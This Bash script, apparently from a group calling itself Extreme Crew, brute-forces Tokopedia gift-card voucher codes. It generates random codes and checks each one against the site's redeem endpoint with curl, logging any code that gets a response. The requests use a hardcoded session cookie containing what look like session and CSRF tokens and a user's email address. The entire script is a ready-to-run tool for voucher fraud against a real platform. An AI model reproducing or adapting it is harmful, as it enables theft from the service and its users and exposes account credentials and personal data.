#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
rm -f extreme.crew
clear
header
if [ ! $1 ];then
echo "1 Akun Max 10 kali generate"
echo "Usage : $0 <jumlah generate>"
echo "EX : $0 10"
exit
fi
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUyNDQ5MDM2M3xJa0poWlVkblNIaHRTWE52UzA1UFMwUmtRM2hFWjNocFJtdzBNM0pDVkRoaFQwcHNVVGNyVERNelZEUTlJZ289fLkA_tRy7mKKJaynLRrmWOxla-Deui17cTb0UC4CjTtF; _BID_TOKOPEDIA_=270b50252c10cc87501fd0002072f346; insUserData=%7B%22email%22%3A%22muhamaddavid%40india2in.com%22%7D; __sonar=10086404441773954789; state=eyJsZCI6Imh0dHBzOi8vYWNjb3VudHMudG9rb3BlZGlhLmNvbS90aGFua3M_dGhlbWU9ZGVmYXVsdFx1MDAyNmxkPVx1MDAyNmFjdGl2YXRpb25fdHlwZT01IiwicmVmIjoiaHR0cHM6Ly93d3cudG9rb3BlZGlhLmNvbSIsInV1aWQiOiI4ZDY1ZjI5OC05NmQ3LTQ1N2EtYmMyNy05NTI2YTgyMTQ4MDYiLCJ0aGVtZSI6ImRlZmF1bHQifQ; _dc_gtm_UA-9801603-1=1; l=1; ins-gaSSId=2a11e8bd-ec84-9b97-ab9d-5dff5a98592e_1524493871; scs=%7B%22t%22%3A1%7D; insdrSV=4; _ID_autocomplete_=b38db02eca6d4119a7bd02a7cb7b16c0; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiZWI2NTM0NDEtYzlhYy00OTFjLTlkMWEtMjk0NjBjMWI5NzM2IiwiaXNfYWpheCI6dHJ1ZX0; _SID_Tokopedia_=4CxjhzItKLCTd_VpBL5i56QfbgmhmzVZ4Y5-H5aoolQ6Wye3aaDNiJTHecFVODV-znSkDzruEdpW0BFyKtkFHOsbYVmoNLBIKgJAHLkUBsaqyHYZRiE16_LNmhTonH4g; pulsa-aff=undefined; _ga=GA1.2.54740781.1524490264; _gid=GA1.2.976566266.1524490264; _uetsid=_uetb0406233; _dc_gtm_UA-9801603-23=1; _ampSES=a9dbc9c663SES2954b1e7df02-30798-1524490385099; _ampUITN=0e9006353cbotc757d3e1dcd0-30798-1524490385105; _ampNV=0; _ampRV=1; _ampCon=Canada; _ampCity=Montreal"
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=FPL$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTssML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	ngegas=$(ngelog $generate | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	if [[ "$ngegas" ]]; then
		echo "$ngegas"
		echo "[-$ngegas-] $generate" >> tokopedia.txt
	fi
done
rm -f extreme.crew
